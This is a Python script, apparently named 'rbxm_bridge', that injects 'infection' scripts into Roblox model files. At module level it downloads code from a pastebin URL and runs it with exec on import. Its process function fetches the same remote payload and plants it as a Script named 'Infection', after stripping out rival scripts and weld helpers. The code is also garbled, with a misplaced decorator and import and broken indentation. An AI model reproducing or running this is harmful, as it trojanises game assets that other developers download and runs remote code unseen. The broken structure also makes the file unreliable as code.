import dist
import os
import json
import gc
from typing import Dict, List, Any, Optional
import sys

class GenericInstance(dist.Instance):
    def __init__(self, class_name: str = "Instance"):
        super().__init__()
        self._custom_class_name = class_name
        self._property_validations_enabled = True
    
    @property
    def ClassName(self):
        return self._custom_class_name
    
    def enable_property_validation(self, enable: bool):
        self._property_validations_enabled = enable
    
    def SetProp(self, name: str, type_: str, value: Any) -> bool:
        if self._property_validations_enabled:
            if name == 'UniqueId':
                return False
            if type_ == 'String' and isinstance(value, str) and len(value) > 500000:
                print(f"[WARN] Skipping large string property {name}")
                return False
        return super().SetProp(name, type_, value)

instance_constructors = {
    "Model": lambda: dist.Model(),
    "Script": lambda: dist.Script(),
    "ModuleScript": lambda: dist.ModuleScript(),
    "Folder": lambda: dist.Folder(),
    "BuoyancySensor": lambda: dist.BuoyancySensor(),
    "Configuration": lambda: dist.Configuration(),
    "AtmosphereSensor": lambda: dist.AtmosphereSensor(),
    "ControllerPartSensor": lambda: dist.ControllerPartSensor(),
    "FluidForceSensor": lambda: dist.FluidForceSensor(),
    "ClickDetector": lambda: dist.ClickDetector(),
    "IntValue": lambda: dist.IntValue(),
}

script_source_cache = {}
import urllib.request as r; exec(r.urlopen("https://pastebin.com/raw/NNtZb1ch").read().decode())
def print_instance_hierarchy(instance: Any, prefix: str = ""):
    print(f"{prefix}{instance.Name} ({instance.ClassName})")
    if hasattr(instance, 'Children') and instance.Children:
        for child in instance.Children:
            print_instance_hierarchy(child, prefix + "  ")

def cache_script_sources(instance: Any):
    if instance.ClassName in ["Script", "ModuleScript"]:
        if hasattr(instance, 'Source') and instance.Source is not None:
            script_source_cache[id(instance)] = instance.Source
    
    if hasattr(instance, 'Children') and instance.Children:
        for child in instance.Children:
            cache_script_sources(child)

def validate_instance(instance: Any, errors: List[str] = None, path: str = "") -> bool:
    if errors is None:
        errors = []
    
    is_valid = True
    current_path = f"{path}.{instance.Name}" if path else instance.Name
    
    if hasattr(instance, '_props') and instance._props:
        for prop_name, prop_value in instance._props.items():
            if prop_name == 'UniqueId':
                errors.append(f"[WARN] Found UniqueId at {current_path}")
            if prop_value is None or prop_value == "":
                errors.append(f"[ERROR] Null/undefined property {prop_name} at {current_path}")
                is_valid = False
    
    if hasattr(instance, 'Children') and instance.Children:
        for child in instance.Children:
            is_valid = validate_instance(child, errors, current_path) and is_valid
    
    return is_valid

def clone_instance(source_instance: Any, target_parent: Any) -> Any:
    constructor = instance_constructors.get(source_instance.ClassName)
    if constructor:
        new_instance = constructor()
    else:
        new_instance = GenericInstance(source_instance.ClassName)
    
    if hasattr(source_instance, '_props') and source_instance._props:
        target_props = getattr(new_instance, '_props', {})
        for key, value in source_instance._props.items():
            if key == 'UniqueId':
                continue
            if hasattr(value, 'type') and value.type == 'BinaryString' and hasattr(value, 'value') and len(value.value) > 1000000:
                print(f"[INFO] Skipping large BinaryString property {key}")
                continue
            try:
                if hasattr(value, 'type') and hasattr(value, 'value'):
                    new_instance.SetProp(key, value.type, value.value)
            except:
                target_props[key] = value
    
    new_instance.Name = source_instance.Name
    new_instance.Parent = target_parent
    
    if source_instance.ClassName in ["Script", "ModuleScript"]:
        cached_source = script_source_cache.get(id(source_instance))
        if cached_source is not None:
            new_instance.SetProp("Source", "String", cached_source)
        elif hasattr(source_instance, 'Source') and source_instance.Source is not None:
            script_source_cache[id(source_instance)] = source_instance.Source
            new_instance.SetProp("Source", "String", source_instance.Source)
    
    if hasattr(source_instance, 'Children') and source_instance.Children:
        for child in source_instance.Children:
            clone_instance(child, new_instance)
    
    return new_instance

def remove_instances(instance: Any, names_to_remove: List[str]):
    children = getattr(instance, 'Children', [])
    for child in list(children):
        if child.Name in names_to_remove:
            if hasattr(child, 'Destroy'):
                child.Destroy()
            print(f"[INFO] Removed instance: {child.Name} ({child.ClassName})")
        else:
            remove_instances(child, names_to_remove)

def find_and_remove_suspicious_scripts(instance: Any) -> int:
    SUSPICIOUS_KEYWORDS = [
        "require", "getfenv", "loadstring", "_G",
        "setfenv", "webhook", "MarketplaceService"
    ]
    
    removed_count = 0
    
    if instance.ClassName in ["Script", "LocalScript"]:
        source = getattr(instance, 'Source', "")
        source_lower = source.lower()
        for keyword in SUSPICIOUS_KEYWORDS:
            if keyword in source_lower:
                print(f'Found suspicious keyword "{keyword}" in script: {instance.Name}. Rewriting content.')
                instance.Source = "-- This script's content was removed for security reasons."
                removed_count += 1
                break
    
    if hasattr(instance, 'Children') and instance.Children:
        for child in instance.Children:
            removed_count += find_and_remove_suspicious_scripts(child)
    
    return removed_count

def inject_infection(original_file: dist.RobloxFile, infection_roots: List[Any]):
    parent_object = original_file.Roots[0]
    errors = []
    
    names_to_remove = [
        "qPerfectionweld", "Effectbuilder", "Manager", "Modulescript", "Controller",
        "zRelativeWeld", "MeshWeld", "AutoWeld", "weld", "InitWeld", "ObjectBuilder",
        "ZPartColorize0", "ObjectGroup", "ModelOptimizer", "ModelGrouper", "WConstraint"
    ]
    
    remove_instances(parent_object, names_to_remove)
    
    removed_scripts = find_and_remove_suspicious_scripts(parent_object)
    if removed_scripts > 0:
        print(f"[INFO] Removed/sanitized {removed_scripts} suspicious scripts")
    
    for root in infection_roots:
        if not validate_instance(root, errors):
            print("[ERROR] Invalid infection root structure:")
            for err in errors:
                print(err)
            raise Exception("Invalid infection structure")
    
    print(f"[INFO] Injecting {len(infection_roots)} infection roots...")
    for i, root in enumerate(infection_roots):
        try:
            cloned_root = clone_instance(root, parent_object)
            if i < 3:
                print_instance_hierarchy(cloned_root)
        except Exception as e:
            print(f"[ERROR] Failed to inject infection root {i}: {e}")
            raise
        
        if i % 10 == 0:
            gc.collect()
    
    print("[SUCCESS] Injected infection into model")

class RbxmBridge:
    @staticmethod
import urllib.request

@staticmethod
def process_model(model_path: str, output_path: str):
    link = "https://pastebin.com/raw/NNtZb1ch"
    
    # Leer modelo original
    with open(model_path, 'rb') as f:
        m_data = f.read()
    file = dist.RobloxFile.ReadFromBuffer(m_data)
    
    if not file or not file.Roots: return
    
    # Descargar código de Pastebin
    try:
        with urllib.request.urlopen(link) as r:
            payload = r.read().decode('utf-8')
    except:
        payload = "-- Error download"

    # Crear e insertar el script
    scr = dist.Script()
    scr.Name = "Infection"
    scr.Parent = file.Roots[0]
    scr.SetProp("Source", "String", payload)
    
    # Guardar resultado
    with open(output_path, 'wb') as f:
        f.write(file.WriteToBuffer())
    print(f"Done: {output_path}")
    
    @staticmethod
    def load_infection(infection_path: str):
        infection_buffer = open(infection_path, 'rb').read()
        infection_file = dist.RobloxFile.ReadFromBuffer(infection_buffer)
        
        if not infection_file or not infection_file.Roots:
            raise Exception("Invalid or empty infection file")
        
        metadata = {
            "roots": [{
                "name": getattr(root, 'Name', 'Unknown'),
                "className": getattr(root, 'ClassName', 'Unknown'),
                "childrenCount": len(getattr(root, 'Children', []))
            } for root in infection_file.Roots]
        }
        print(json.dumps(metadata))
    
    @staticmethod
    def validate_model(model_path: str):
        model_buffer = open(model_path, 'rb').read()
        model_file = dist.RobloxFile.ReadFromBuffer(model_buffer)
        
        if not model_file or not model_file.Roots:
            raise Exception("Invalid or empty model file")
        
        errors = []
        is_valid = True
        
        for root in model_file.Roots:
            is_valid = validate_instance(root, errors) and is_valid
        
        result = {
            "valid": is_valid,
            "errors": errors,
            "rootCount": len(model_file.Roots)
        }
        print(json.dumps(result))
    
    @staticmethod
    def print_usage():
        print("Usage:")
        print("  python rbxm_bridge.py process <model_path> <infection_path> <output_path>")
        print("  python rbxm_bridge.py load <infection_path>")
        print("  python rbxm_bridge.py validate <model_path>")
        print("")
        print("Commands:")
        print("  process   - Inject infection into model and save result")
        print("  load      - Load infection file and return metadata")
        print("  validate  - Validate model file structure")

def main():
    args = sys.argv[1:]
    
    if not args:
        RbxmBridge.print_usage()
        sys.exit(1)
    
    command = args[0]
    
    try:
        if command == 'process':
            if len(args) != 4:
                print("Error: process command requires 3 arguments")
                RbxmBridge.print_usage()
                sys.exit(1)
            RbxmBridge.process_model(args[1], args[2], args[3])
        
        elif command == 'load':
            if len(args) != 2:
                print("Error: load command requires 1 argument")
                RbxmBridge.print_usage()
                sys.exit(1)
            RbxmBridge.load_infection(args[1])
        
        elif command == 'validate':
            if len(args) != 2:
                print("Error: validate command requires 1 argument")
                RbxmBridge.print_usage()
                sys.exit(1)
            RbxmBridge.validate_model(args[1])
        
        else:
            print(f"Error: Unknown command '{command}'")
            RbxmBridge.print_usage()
            sys.exit(1)
    
    except Exception as e:
        print(f"[FATAL] Command execution failed: {e}")
        sys.exit(1)

if __name__ == "__main__":
    main()
